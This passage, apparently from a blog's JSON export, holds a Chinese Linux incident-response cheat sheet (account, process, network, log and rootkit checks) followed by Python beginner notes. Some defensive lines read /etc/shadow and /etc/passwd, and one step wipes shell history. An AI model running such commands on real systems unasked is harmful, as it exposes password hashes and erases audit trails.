&apos;/\\$1|\\$6/&#123;print $1&#125;&apos; /etc/shadow 3.查询sudoer如非管理需要，普通用户应删除sudo权限 1more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot; 4.禁用或删除可疑用户123usermod -L username //禁用用户，用户无法登录，/etc/shadow第二栏为！开头userdel username //删除用户userdel -r user //删除用户，并删除家目录 历史命令1.保存1万条命令1sed -i &apos;s/^HISTSIZE=1000/HISTSIZE=10000/g&apos; /etc/profile 2.增加历史信息123456789101112//在/etc/profile的文件尾部添加配置信息######jiagu history xianshi#########USER_IP=`who -u am i 2&gt;/dev/null | awk &apos;&#123;print $NF&#125;&apos; | sed -e &apos;s/[()]//g&apos;`if [ &quot;$USER_IP&quot; = &quot;&quot; ]thenUSER_IP=`hostname`fiexport HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;shopt -s histappendexport PROMPT_COMMAND=&quot;history -a&quot;######### jiagu history xianshi ##########source /etc/profile //配置生效 3.清除历史记录12history -crm -f .bash_profile 端口分析可疑端口、IP、PID 1netstat -antlup 进程1ps aux|grep PID 服务1.查询已安装的服务12apt listchkconfig --list 开机启动项启动项文件 1/etc/rc.local 常见应急问题挖矿、菠菜、勒索病毒 痕迹备份分析日志前先备份日志，可以通过tar压缩备份 备份/var/log下所有日志1tar -zcvf /home/chessur/logs.tar.gz /var/log 备份last1last &gt; /home/chessur/last.log 备份在线用户1w &gt; /home/chessur/w.log 备份系统服务1systemctl -a &gt; services.log 备份进程1ps -ef &gt; ps.log 备份监听端口1netstat -nlutp &gt; port-listen.log 备份所有端口情况1netstat -ano &gt; port-all.log 备份历史记录1cat .bash_history &gt; history.txt 排查流程找出问题->解决问题->编写报告菠菜需要多注意网站配置文件是否被修改、网页是否被植入链接 进程排查1.查看当前系统状态top可以持续的监视进程的信息碰到挖矿应急通常优先使用top命令查看系统进程，因为挖矿病毒会占用较多CPU 2.查看当前系统进程信息(ps)psProcess Status的缩写。ps命令用来列出系统中当前运行的进程。ps命令列出的是当前进程的快照，就是执行ps命令的那个时刻的那些进程，如果想要动态的显示进程信息，就可以使用top命令。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677Usage: ps [options]Basic options: -A, -e all processes -a all with tty, except session leaders a all with tty, including other users -d all except session leaders -N, --deselect negate selection r only running processes T all processes on this terminal x processes without controlling ttysSelection by list: -C &lt;command&gt; command name -G, --Group &lt;GID&gt; real group id or name -g, --group &lt;group&gt; session or effective group name -p, p, --pid &lt;PID&gt; process id --ppid &lt;PID&gt; parent process id -q, q, --quick-pid &lt;PID&gt; process id (quick mode) -s, --sid &lt;session&gt; session id -t, t, --tty &lt;tty&gt; terminal -u, U, --user &lt;UID&gt; effective user id or name -U, --User &lt;UID&gt; real user id or name The selection options take as their argument either: a comma-separated list e.g. &apos;-u root,nobody&apos; or a blank-separated list e.g. &apos;-p 123 4567&apos;Output formats: -F extra full -f full-format, including command lines f, --forest ascii art process tree -H show process hierarchy -j jobs format j BSD job control format -l long format l BSD long format -M, Z add security data (for SELinux) -O &lt;format&gt; preloaded with default columns O &lt;format&gt; as -O, with BSD personality -o, o, --format &lt;format&gt; user-defined format s signal format u user-oriented format v virtual memory format X register format -y do not show flags, show rss vs. addr (used with -l) --context display security context (for SELinux) --headers repeat header lines, one per page --no-headers do not print header at all --cols, --columns, --width &lt;num&gt; set screen width --rows, --lines &lt;num&gt; set screen heightShow threads: H as if they were processes -L possibly with LWP and NLWP columns -m, m after processes -T possibly with SPID columnMiscellaneous options: -c show scheduling class with -l option c show true command name e show the environment after command k, --sort specify sort order as: [+|-]key[,[+|-]key[,...]] L show format specifiers n display numeric uid and wchan S, --cumulative include some dead child process data -y do not show flags, show rss (only with -l) -V, V, --version display version information and exit -w, w unlimited output width --help &lt;simple|list|output|threads|misc|all&gt; display help and exit 3.查看非root运行的进程1ps -u root -N 4.查看root运行的进程1ps -u root 5.查看奇怪进程1ps -aef|grep inetd 6.检查隐藏进程1ps -ef|awk &apos;&#123;print&#125;&apos;|sort -n|uniq &gt; 1 1ls /proc | sort -n |uniq &gt; 2 sort将文本文件内容排序，-n安装数值大小排序uniq去掉文本中重复出现的行列 7.检查计划任务123456789ls /etc/crontabcrontab -u user -lusage: crontab [-u user] file crontab [ -u user ] [ -i ] &#123; -e | -l | -r &#125; (default operation is replace, per 1003.2) -e (edit user&apos;s crontab) -l (list user&apos;s crontab) -r (delete user&apos;s crontab) -i (prompt before deleting user&apos;s crontab) 活动痕迹排查1.查看当前登录用户who显示系统中有哪些使用者 1who -H 2.查看当前登录用户信息w显示目前登入系统的用户信息。 3.查看最近登录信息last显示用户最近登录信息 1last -num //显示前num个 4.查看bash历史命令history列出以前输入的命令和 Bash 日志。 1history num //显示最近的num个 5.查看空口令账号1awk -F: &apos;($2==&quot;&quot;)&apos; /etc/shadow 6.查看uid为0的账号12awk -F: &apos;($3==0)&apos; /etc/passwdcat /etc/passwd|grep &quot;:0:&quot; 7.查看进程树pstree以树状图的方式展现进程之间的派生关系 1234567891011-a：显示每个程序的完整指令，包含路径，参数或是常驻服务的标示；-c：不使用精简标示法；-G：使用VT100终端机的列绘图字符；-h：列出树状图时，特别标明现在执行的程序；-H&lt;程序识别码&gt;：此参数的效果和指定&quot;-h&quot;参数类似，但特别标明指定的程序；-l：采用长列格式显示树状图；-n：用程序识别码排序。预设是以程序名称来排序；-p：显示程序识别码；-u：显示用户名称；-U：使用UTF-8列绘图字符；-V：显示版本信息。 网络排查1.netstatnetstat用于显示网络状态 1234567891011121314151617181920212223242526272829303132333435usage: netstat [-vWeenNcCF] [&lt;Af&gt;] -r netstat &#123;-V|--version|-h|--help&#125; netstat [-vWnNcaeol] [&lt;Socket&gt; ...] netstat &#123; [-vWeenNac] -i | [-cnNe] -M | -s [-6tuw] &#125; -r, --route display routing table -i, --interfaces display interface table -g, --groups display multicast group memberships -s, --statistics display networking statistics (like SNMP) -M, --masquerade display masqueraded connections -v, --verbose be verbose -W, --wide don&apos;t truncate IP addresses -n, --numeric don&apos;t resolve names --numeric-hosts don&apos;t resolve host names --numeric-ports don&apos;t resolve port names --numeric-users don&apos;t resolve user names -N, --symbolic resolve hardware names -e, --extend display other/more information -p, --programs display PID/Program name for sockets -o, --timers display timers -c, --continuous continuous listing -l, --listening display listening server sockets -a, --all display all sockets (default: connected) -F, --fib display Forwarding Information Base (default) -C, --cache display routing cache instead of FIB -Z, --context display SELinux security context for sockets &lt;Socket&gt;=&#123;-t|--tcp&#125; &#123;-u|--udp&#125; &#123;-U|--udplite&#125; &#123;-S|--sctp&#125; &#123;-w|--raw&#125; &#123;-x|--unix&#125; --ax25 --ipx --netrom &lt;AF&gt;=Use &apos;-6|-4&apos; or &apos;-A &lt;af&gt;&apos; or &apos;--&lt;af&gt;&apos;; default: inet List of possible address families (which support routing): inet (DARPA Internet) inet6 (IPv6) ax25 (AMPR AX.25) netrom (AMPR NET/ROM) ipx (Novell IPX) ddp (Appletalk DDP) x25 (CCITT X.25) 2.查看进程占用端口情况lsof用于查看进程打开的文件，打开文件的进程，进程打开的端口(TCP、UDP) 123456789101112-a：列出打开文件存在的进程；-c&lt;进程名&gt;：列出指定进程所打开的文件；-g：列出GID号进程详情；-d&lt;文件号&gt;：列出占用该文件号的进程；+d&lt;目录&gt;：列出目录下被打开的文件；+D&lt;目录&gt;：递归列出目录下被打开的文件；-n&lt;目录&gt;：列出使用NFS的文件；-i&lt;条件&gt;：列出符合条件的进程。（4、6、协议、:端口、 @ip ）-p&lt;进程号&gt;：列出指定进程号所打开的文件；-u：列出UID号进程详情；-h：显示帮助信息；-v：显示版本信息。 1234lsof -i:port //查看端口lsof -i tcp //查看TCP连接lsof -i udp //查看UDP连接lsof -p PID //查看进程号 文件排查1.查看文件ls用于显示指定工作目录下之内容 1ls -al 2.定位程序位置whereis用来定位指令的二进制程序、源代码文件和man手册页等相关文件的路径。 12345678-b：只查找二进制文件；-B&lt;目录&gt;：只在设置的目录下查找二进制文件；-f：不显示文件名前的路径名称；-m：只查找说明文件；-M&lt;目录&gt;：只在设置的目录下查找说明文件；-s：只查找原始代码文件；-S&lt;目录&gt;只在设置的目录下查找原始代码文件；-u：查找不包含指定类型的文件。 example1whereis nmap 3.查找最近修改过的文件find用来在指定目录下查找文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455-amin&lt;分钟&gt;：查找在指定时间曾被存取过的文件或目录，单位以分钟计算；-anewer&lt;参考文件或目录&gt;：查找其存取时间较指定文件或目录的存取时间更接近现在的文件或目录；-atime&lt;24小时数&gt;：查找在指定时间曾被存取过的文件或目录，单位以24小时计算；-cmin&lt;分钟&gt;：查找在指定时间之时被更改过的文件或目录；-cnewer&lt;参考文件或目录&gt;查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录；-ctime&lt;24小时数&gt;：查找在指定时间之时被更改的文件或目录，单位以24小时计算；-daystart：从本日开始计算时间；-depth：从指定目录下最深层的子目录开始查找；-expty：寻找文件大小为0 Byte的文件，或目录下没有任何子目录或文件的空目录；-exec&lt;执行指令&gt;：假设find指令的回传值为True，就执行该指令；-false：将find指令的回传值皆设为False；-fls&lt;列表文件&gt;：此参数的效果和指定“-ls”参数类似，但会把结果保存为指定的列表文件；-follow：排除符号连接；-fprint&lt;列表文件&gt;：此参数的效果和指定“-print”参数类似，但会把结果保存成指定的列表文件；-fprint0&lt;列表文件&gt;：此参数的效果和指定“-print0”参数类似，但会把结果保存成指定的列表文件；-fprintf&lt;列表文件&gt;&lt;输出格式&gt;：此参数的效果和指定“-printf”参数类似，但会把结果保存成指定的列表文件；-fstype&lt;文件系统类型&gt;：只寻找该文件系统类型下的文件或目录；-gid&lt;群组识别码&gt;：查找符合指定之群组识别码的文件或目录；-group&lt;群组名称&gt;：查找符合指定之群组名称的文件或目录；-help或——help：在线帮助；-ilname&lt;范本样式&gt;：此参数的效果和指定“-lname”参数类似，但忽略字符大小写的差别；-iname&lt;范本样式&gt;：此参数的效果和指定“-name”参数类似，但忽略字符大小写的差别；-inum&lt;inode编号&gt;：查找符合指定的inode编号的文件或目录；-ipath&lt;范本样式&gt;：此参数的效果和指定“-path”参数类似，但忽略字符大小写的差别；-iregex&lt;范本样式&gt;：此参数的效果和指定“-regexe”参数类似，但忽略字符大小写的差别；-links&lt;连接数目&gt;：查找符合指定的硬连接数目的文件或目录；-iname&lt;范本样式&gt;：指定字符串作为寻找符号连接的范本样式；-ls：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出；-maxdepth&lt;目录层级&gt;：设置最大目录层级；-mindepth&lt;目录层级&gt;：设置最小目录层级；-mmin&lt;分钟&gt;：查找在指定时间曾被更改过的文件或目录，单位以分钟计算；-mount：此参数的效果和指定“-xdev”相同；-mtime&lt;24小时数&gt;：查找在指定时间曾被更改过的文件或目录，单位以24小时计算；-name&lt;范本样式&gt;：指定字符串作为寻找文件或目录的范本样式；-newer&lt;参考文件或目录&gt;：查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录；-nogroup：找出不属于本地主机群组识别码的文件或目录；-noleaf：不去考虑目录至少需拥有两个硬连接存在；-nouser：找出不属于本地主机用户识别码的文件或目录；-ok&lt;执行指令&gt;：此参数的效果和指定“-exec”类似，但在执行指令之前会先询问用户，若回答“y”或“Y”，则放弃执行命令；-path&lt;范本样式&gt;：指定字符串作为寻找目录的范本样式；-perm&lt;权限数值&gt;：查找符合指定的权限数值的文件或目录；-print：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为每列一个名称，每个名称前皆有“./”字符串；-print0：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为全部的名称皆在同一行；-printf&lt;输出格式&gt;：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式可以自行指定；-prune：不寻找字符串作为寻找文件或目录的范本样式;-regex&lt;范本样式&gt;：指定字符串作为寻找文件或目录的范本样式；-size&lt;文件大小&gt;：查找符合指定的文件大小的文件；-true：将find指令的回传值皆设为True；-typ&lt;文件类型&gt;：只寻找符合指定的文件类型的文件；-uid&lt;用户识别码&gt;：查找符合指定的用户识别码的文件或目录；-used&lt;日数&gt;：查找文件或目录被更改之后在指定时间曾被存取过的文件或目录，单位以日计算；-user&lt;拥有者名称&gt;：查找符和指定的拥有者名称的文件或目录；-version或——version：显示版本信息；-xdev：将范围局限在先行的文件系统中；-xtype&lt;文件类型&gt;：此参数的效果和指定“-type”参数类似，差别在于它针对符号连接检查。 1find / -mtime num //num表示文件修改之后的num天 定位根据PID定位12lsof -p PIDls -al /etc/proc/PID 根据名称定为1find / -name &quot;Process Name&quot; 停止进程1kill -9 PID 若出现Operation not permitted，可能是病毒使用了chattr +i，使用chattr -i filename 清除后门SSH后门在/root/.ssh/目录下，攻击者可能会创建自己的SSH公钥，保持控制权限，删除未知公钥 命令被替换清除可以命令，安装干净的命令可以用strings查看命令内容 日志目录 目录 记录内容 /etc/crontab 计划任务目录，文件内容格式*/1 * * * * chessur ls /&gt;&gt;/opt/crontab-e 2&gt;&amp;1需要在五个*后面加上用户名 /var/spool/cron/ 计划任务目录，以用户名目录来区分不同用户的计划任务，文件内容格式*/1 * * * * ls /&gt;&gt;/opt/crontab-e 2&gt;&amp;1，不需要加上用户名 /var/log/messages 整体系统信息日志，包含了系统启动时的引导消息，以及系统运行时的其他状态消息。IO 错误、网络错误和其他系统错误都会记录到这个文件中 /var/log/syslog 系统启动期间的日志，只记录警告信息，系统出问题的信息 /var/log/user.log 用户信息日志 /var/log/auth.log 系统授权日志，记录登录信息 /var/log/cron 记录crontab守护进程crond所派生的子进程的动作，前面加上用户、登录时间和PID，以及派生出的进程的动作 /var/log/xferlog FTP系统日志，记录用户与FTP服务器的交互信息 /var/log/secure 包含验证和授权方面信息，sshd会将所有信息记录（其中包括失败登录）在这里 /var/log/lastlog 记录最近成功登录的事件和最后一次不成功的事件，使用lastlog命令查看，该命令只能以root权限执行 /var/log/maillog 记录了每一个发送到系统或从系统发出的电子邮件的活动 /var/log/wtmp 永久记录每个用户登录、注销及系统的启动、停机的事件，使用last命令查看 /var/run/utmp 记录有关当前登录的每个用户的信息，执行who、w、users、finger等命令时会访问该文件 /var/log/btmp 记录所有失败登录信息。使用last命令查看btmp文件`last -f /var/log/btmp /etc/httpd/logs/access.log Apache访问日志 /var/log/httpd或/var/log/apache2 Apache的访问日志 /var/log/lighttpd light HTTPD的访问日志 /var/log/samba/ samba存储的信息 /var/log/nginx/ Nginx访问日志目录 日志分析技巧1、定位有多少IP在爆破主机的root帐号：1grep &quot;Failed password for root&quot; /var/log/secure | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more 定位有哪些IP在爆破：1grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c 爆破用户名字典是什么？1grep &quot;Failed password&quot; /var/log/secure|perl -e &apos;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\\n&quot;;&#125;&apos;|uniq -c|sort -nr 2、登录成功的IP有哪些：1grep &quot;Accepted &quot; /var/log/secure | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more 登录成功的日期、用户名、IP：1grep &quot;Accepted &quot; /var/log/secure | awk &apos;&#123;print $1,$2,$3,$9,$11&#125;&apos; 3、增加一个用户kali日志：12345Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bashJul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali#grep &quot;useradd&quot; /var/log/secure 4、删除用户kali日志：1234Jul 10 00:14:17 localhost userdel[2393]: delete user &apos;kali&apos;Jul 10 00:14:17 localhost userdel[2393]: removed group &apos;kali&apos; owned by &apos;kali&apos;Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &apos;kali&apos; owned by &apos;kali&apos;# grep &quot;userdel&quot; /var/log/secure 5、su切换用户：1Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo授权执行:12sudo -lJul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now 工具Rootkit查杀chkrootkit 1234567使用方法：wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gztar zxvf chkrootkit.tar.gzcd chkrootkit-0.52make sense编译完成没有报错的话执行检查./chkrootkit rkhunter 123456使用方法：Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gztar -zxvf rkhunter-1.4.4.tar.gzcd rkhunter-1.4.4./installer.sh --installrkhunter -c 病毒查杀Clamav 安装方式一： 1234567891011121314151617181920212223242526272829303132331、安装zlib：wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz tar -zxvf zlib-1.2.7.tar.gzcd zlib-1.2.7#安装一下gcc编译环境： yum install gccCFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix= /usr/local/zlib/make &amp;&amp; make install2、添加用户组clamav和组成员clamav：groupadd clamavuseradd -g clamav -s /bin/false -c &quot;Clam AntiVirus&quot; clamav3、安装Clamavtar –zxvf clamav-0.97.6.tar.gzcd clamav-0.97.6./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlibmakemake install4、配置Clamavmkdir /opt/clamav/logsmkdir /opt/clamav/updatatouch /opt/clamav/logs/freshclam.logtouch /opt/clamav/logs/clamd.logcd /opt/clamav/logschown clamav:clamav clamd.logchown clamav:clamav freshclam.log5、ClamAV 使用： /opt/clamav/bin/freshclam 升级病毒库./clamscan –h 查看相应的帮助信息./clamscan -r /home 扫描所有用户的主目录就使用./clamscan -r --bell -i /bin 扫描bin目录并且显示有问题的文件的扫描结果 安装方式二： 1234567891011121314#安装yum install -y clamav#更新病毒库freshclam#扫描方法clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.logclamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.logclamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log#扫描并杀毒clamscan -r --remove /usr/bin/bsd-portclamscan -r --remove /usr/bin/clamscan -r --remove /usr/local/zabbix/sbin#查看日志发现cat /root/usrclamav.log |grep FOUND webshell查杀河马webshell查杀深信服Webshell网站后门检测工具 HWHW时碰到一些事件的处置方案 钓鱼邮件有两类钓鱼邮件，第一类是通过XSS来获取Cookie，再进一步发送钓鱼邮件，由于是从相同企业邮箱地址发送来的邮件，收件人不会很警觉，可能会直接下载并打开附件；第二类是直接从其他邮箱发送钓鱼邮件，直接发送附件，由于该类邮件是从未知的邮箱发送过来，收件人并不会像第一类那么信任邮件 收到钓鱼邮件后，将邮件保存为eml格式文件，发送给企业信息安全部门进行分析 两类邮件中，都会有恶意文件，需要对恶意文件进行分析，分析回连地址。还有挺多专业名词，白文件，证书，C2都不是很了解，等有时间看看再加上 对于钓鱼邮件的防范方法：对公司邮箱系统设置类似WAF的安全设备，发现恶意邮件时直接拦截在邮箱登录上设置两步验证，这样即使窃取密码，也无法登录培训员工安全意识，碰到未知邮件，不要轻易点开，确认安全后再打开 敏感文件泄漏1.尽快清理暴露文件2.排查关键中间件配置减少文件和信息暴露3.对敏感页面做权限限制，关闭目录显示 心脏滴血若通过心脏滴血漏洞泄露账号密码，需修改账号密码。 参考[1] blubiu [2] Linux安全事件应急响应排查方法总结 [3] 应急响应实战笔记 [4] 记一次Windows日志分析：LogParse [5] 应急响应处置流程Windows篇 [6] 防范鱼叉式网络钓鱼攻击的8个诀窍","categories":[],"tags":[]},{"title":"'Python Notes'","slug":"Python-Notes","date":"2019-05-17T02:22:27.000Z","updated":"2019-07-04T11:23:38.739Z","comments":true,"path":"2019/05/17/Python-Notes/","link":"","permalink":"https://chirec.github.io/2019/05/17/Python-Notes/","excerpt":"1# -*- coding: utf-8 -*- 可以识别中文 123&apos;&apos;&apos;xxxxxxxxx&apos;&apos;&apos; 多行注释","text":"1# -*- coding: utf-8 -*- 可以识别中文 123&apos;&apos;&apos;xxxxxxxxx&apos;&apos;&apos; 多行注释 代码规范PEP8(Python Enhancement Proposal) 函数和类的定义，代码前后都要用两个空行进行分隔。 在同一个类中，各个方法之间应该用一个空行进行分隔。 二元运算符的左右两侧应该保留一个空格，而且只要一个空格就好。 变量、函数和属性应该使用小写字母来拼写，如果有多个单词就使用下划线进行连接。 类中受保护的实例属性，应该以一个下划线开头。 类中私有的实例属性，应该以两个下划线开头。 类和异常的命名，应该每个单词首字母大写。 模块级别的常量，应该采用全大写字母，如果有多个单词就用下划线进行连接。 类的实例方法，应该把第一个参数命名为self以表示对象自身。 类的类方法，应该把第一个参数命名为cls以表示该类自身。 import语句总是放在文件开头的地方。 引入模块的时候，from math import sqrt比import math更好。 如果有多个import语句，应该将其分为三部分，从上到下分别是Python标准模块、第三方模块和自定义模块，每个部分内部应该按照模块名称的字母表顺序来排列。 不要用检查长度的方式来判断字符串、列表等是否为None或者没有元素，应该用if not x这样的写法来检查它。 采用内联形式的否定词，而不要把否定词放在整个表达式的前面。例如if a is not b就比if not a is b更容易让人理解。 __代替未使用的变量 集合list顺序，可重复查询速度慢，不占内存 remove()删除已知的元素，不能删除指定位置的元素 12name = [&apos;Andy&apos;,&apos;York&apos;]name.remove(&apos;Andy&apos;) 比较Python使用列表的第一个元素进行比较 字符串操作123name = [&apos;Andy&apos;]name * 3[&apos;Andy&apos;,&apos;Andy&apos;,&apos;Andy&apos;] in &amp; not in12345name = [&apos;Andy&apos;,&apos;York&apos;]&apos;Andy&apos; in nameTrue&apos;York&apos; not in nameFalse index()查询参数在列表的位置 12name = [&apos;Andy&apos;,&apos;York&apos;]name.index(&apos;York&apos;) count()查询同一元素在列表里出现的次数 1234name = [&apos;Andy&apos;,&apos;York&apos;]name.extend([&apos;Andy&apos;,&apos;Windy&apos;])name.count(&apos;Andy&apos;)name.count(&apos;Windy&apos;) reverse()将列表顺序颠倒 12number = [1,2,3,4,5,67,,89,98,3,5,346,56,0]number.reverse() reversed()返回逆向迭代的序列值 1234list = [1,2,3,4,5,26]for each in reversed(list): print(each,end = &apos;,&apos;)//26,5,4,3,2,1, sort()按顺序排列，改变列表原始值 12number = [1,2,3,4,5,67,,89,98,3,5,346,56,0]number.sort() sorted()按顺序排列，不改变列表原始值 del删除列表 12name = [&apos;Andy&apos;,&apos;York&apos;]del name dict顺序，key-value对，key不可重复查询速度快，占内存 获取value 1变量名[key] 变量名.get(key) 变量名.get(key,&apos;找不到key对应的值时使用的value&apos;) 123for key in dict: print(&apos;s&apos;.format(key)) print(&apos;s&apos;.format(value)) set无序，不可重复查询速度快，不占内存 tuple不可更改元素 添加元素12tuple = (1,2,3,4,5)tuple = tuple[:3] + (26,) + tuple[3:] 删除元素12tuple = (1,2,3,4,5)tuple = tuple[:2] + tuple[3:] 求长度len() 切片slice[index:length]第一个索引是0可以省略L[:26]只用一个:表示从头到尾L[:]第三个参数，表示每个N个取一个L[::2],每2个元素取一个索引可以为负值，表示倒数第N个字符串也是一种list，可以进行切片操作 123a = [1,2,3,4,5]b = a[:]c = a 切片是将值赋给变量 enumerate()将list加上索引 123[&apos;Adam&apos;, &apos;Lisa&apos;, &apos;Bart&apos;, &apos;Paul&apos;]//enumerate()[(0, &apos;Adam&apos;), (1, &apos;Lisa&apos;), (2, &apos;Bart&apos;), (3, &apos;Paul&apos;)] zip()将两个list结合 12zip([10, 20, 30], [&apos;A&apos;, &apos;B&apos;, &apos;C&apos;])[(10, &apos;A&apos;), (20, &apos;B&apos;), (30, &apos;C&apos;)] 迭代dict的valuevalues()方法：将dict转换为包含了value的list itervalues()方法：在迭代过程中依次从dict中取出value，节省内存 同时迭代dict的value和keyitems()方法 iteritems()方法 列表生成式12[x * x for x in range(1,11)][1, 4, 9, 16, 25, 36, 49, 64, 81, 100] 列表生成式的 for 循环后面还可以加上 if 判断 12[x * x for x in range(1, 11) if x % 2 == 0][4, 16, 36, 64, 100] 复杂列表生成式12345tds = [&apos;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&apos; % (name, score) for name, score in d.iteritems()]print &apos;&lt;table&gt;&apos;print &apos;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Score&lt;/th&gt;&lt;tr&gt;&apos;print &apos;\\n&apos;.join(tds)print &apos;&lt;/table&gt;&apos; max()返回集合或参数中的最大值 123456list = [1,2,3,26]name = &apos;Andy&apos;max(list)//26max(name)//y min()返回集合或参数中的最小值 sum()返回总和 String替换string.replace()1string.replace(&apos;被替换&apos;,&apos;待替换&apos;) 替换多个 1string.replace(&apos;被替换&apos;,&apos;待替换&apos;).replace(&apos;被替换&apos;,&apos;待替换&apos;) 分割split()将字符串分割成列表 123split(sep=None, maxsplit=-1)//sep是分割符，默认为空格//maxsplit是分割数量，默认为-1，即无限制 input()python3中没有raw_input()将raw_input()和input()整合为input() 转换Ascii码1ord(str) 字符1chr(num) 函数print()format()12345678910111213A = 1B = 2#位置参数print(&quot;A+B=&#123;&#125; A-B=&#123;&#125;&quot;.format(A+B,A-B))print(&quot;A+B=&#123;0&#125; A-B=&#123;1&#125;&quot;.format(A+B,A-B))#关键词参数print(&quot;A+B=&#123;a&#125; A-B=&#123;b&#125;&quot;.format(a = A+B,b = A-B))#位置参数必须在关键词参数前面#错误用法：SyntaxError: positional argument follows keyword argumentprint(&quot;A+B=&#123;a&#125; A-B=&#123;0&#125;&quot;.format(a = A+B,A-B))#正确用法：print(&quot;A+B=&#123;0&#125; A-B=&#123;a&#125;&quot;.format(A+B,a = A-B)) print(f)1print(f&apos;计算0-9的平方分别为：&#123;result&#125;&apos;) 格式化操作符 符号 含义 %c 格式化字符及ASCII %s 格式化字符串 %d 格式化整数 %o 格式化无符号八进制 %x 格式化无符号十六进制数 %X 格式化无符号十六进制数(大写) %f 格式化浮点数字，可指定小数点后的精度 %e 用科学计数法格式化浮点数 %E 用科学计数法格式化浮点数(大写) %g 根据值的大小决定使用%f或%E %G 根据值的大小决定使用%f或%E(大写) 12&apos;%c&apos; % 99&apos;%c%c%c%c%c%c%c&apos; % (99,104,101,115,115,117,114) 格式化操作符的辅助命令 符号 含义 m.n m是最小总宽度，n是小数点后的位数 - 结果左对齐 + 在证书面前显示加号（+） # 在八进制面前显示‘0o’，在十六进制数面前显示‘0x’,’0X’ 0 显示的数字前面填充‘0’代替空格 Python的转义字符及含义 符号 含义 \\’ 单引号 \\” 双引号 \\a 发出系统响铃 \\b 退格符 \\n 换行符 \\t 横向制表符（TAB） \\v 纵向制表符 \\r 回车符 \\f 换页符 \\o 八进制数代表字符 \\x 十六进制数代表字符 \\0 代表一个空字符 \\\\ 反斜杠 正则表达式re模块regular expression 1import re findall()1re.findall(pattern,string,flags=0) re模块包含一个findall()方法它能够以列表形式返回所有满足要求的字符串，若没有匹配到结果，就会返回空列表。flags表示一些特殊功能的标志 search()1re.search()(pattern,string,flags=0) search()方法返回第一个匹配的值 形式为 1&lt;re.Match object; span=(12, 27), match=&apos;密码是：weibomima1，&apos;&gt; 使用group获得search()返回的结果 使用group(1)获得search()返回的结果中括号内的值 re.S将.的作用扩展到整个字符串，包括\\n 文件操作打开文件Python文件操作mode如果想读取，必须为&#39;r&#39; 方法1123file = open (&apos;文件路径&apos;,&apos;文件操作方式&apos;,encoding=&apos;utf-8&apos;)对文件进行操作file.close() 方法212with open(&apos;文件路径&apos;,&apos;文件操作方式&apos;,encoding=&apos;utf-8&apos;) as file: 对文件进行操作 第一种需要手动给关闭文件第二种需要注意缩进，退出缩进Python就会自动关闭文件 读文件读取文件可以使用相对路径和绝对路径相对路径是文本文件相对于现在的工作区而言的路径，并不总是相对于当前正在运行的这个Python文件的路径 Python需要导入os模块来使用~表示家目录 12import osreal_path=os.path.expanduse(&apos;~/project/xxx&apos;) 打开文件12with open(&apos;文件路径&apos;,&apos;r&apos;,encoding=&apos;utf-8&apos;) as file: 对文件进行操作 readlines()读取文件内容，将文件的每一行作为列表元素返回readlines()会将文件内容取出，如果再次使用read()读取会返回空值 read()读取文件内容，将所有内容作为字符串返回 readline()每次读取一行，使用循环读取所有内容 写文件12with open(&apos;文件路径&apos;,&apos;w&apos;,encoding=&apos;utf-8&apos;) as file: 对文件进行操作 写文件有2种，w和a w覆盖掉之前的内容，a是追加内容 write()直接将一段字符串写入文本 writelines()writelines([&#39;line0&#39;,&#39;line1&#39;]) 在写文件时，Python不会添加换行符，需要手动添加 操作CSV文件Python自带处理CSV文件的模块 Python处理CSV文件需要有序字典形式 1import csv 读CSV文件1234with open(&apos;csvfile&apos;,&apos;r&apos;,encoding=&apos;utf-8&apos;) as csvfile: reader = csv.DictReader(file) for row in reader: print(row) 写CSV文件12345with open(&apos;csvfile&apos;,&apos;a&apos;,encoding=&apos;utf-8&apos;) as csvfile: writer = csv.DictWriter(csvfile,fieldnames=[&apos;name&apos;,&apos;age&apos;,&apos;salary&apos;]) writer.writeheader() writer.writerows(data) writer.writerow(&#123;&apos;name&apos;:Greeny,&apos;age&apos;:24,&apos;salary&apos;:99999&#125;) 模块requests模块requests.get()1requests.get(&apos;url&apos;) 返回Response对象 Response.content返回二进制格式的网页内容 